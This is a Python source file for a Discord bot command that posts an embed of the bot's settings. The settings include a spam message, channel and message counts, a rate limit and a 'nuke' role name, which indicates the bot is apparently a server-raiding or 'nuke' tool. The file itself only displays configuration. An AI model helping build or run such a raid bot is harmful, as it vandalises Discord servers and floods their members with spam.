from core.commands.base import BaseCommand
from core.config.settings import *
import discord

class ConfigCommand(BaseCommand):
    async def _execute(self, ctx):
        embed = discord.Embed(
            title="BOT CONFIGURATION",
            color=0x00ff00
        )
        embed.add_field(name="Channel Name", value=f"{CHANNEL_NAME}", inline=False)
        embed.add_field(name="Random Names", value=f"{'Enabled' if USE_RANDOM_NAMES else 'Disabled'}", inline=True)
        embed.add_field(name="Spam Message", value=f"{SPAM_MESSAGE[:50]}...", inline=True)
        embed.add_field(name="Channels", value=f"{CHANNEL_COUNT}", inline=True)
        embed.add_field(name="Messages", value=f"{MESSAGE_COUNT}", inline=True)
        embed.add_field(name="Rate Limit", value=f"{RATE_LIMIT_SECONDS}s", inline=True)
        embed.add_field(name="Role Name", value=f"{NUKE_ROLE_NAME}", inline=True)
        embed.set_footer(text="mod made by fevber")
        await ctx.send(embed=embed)
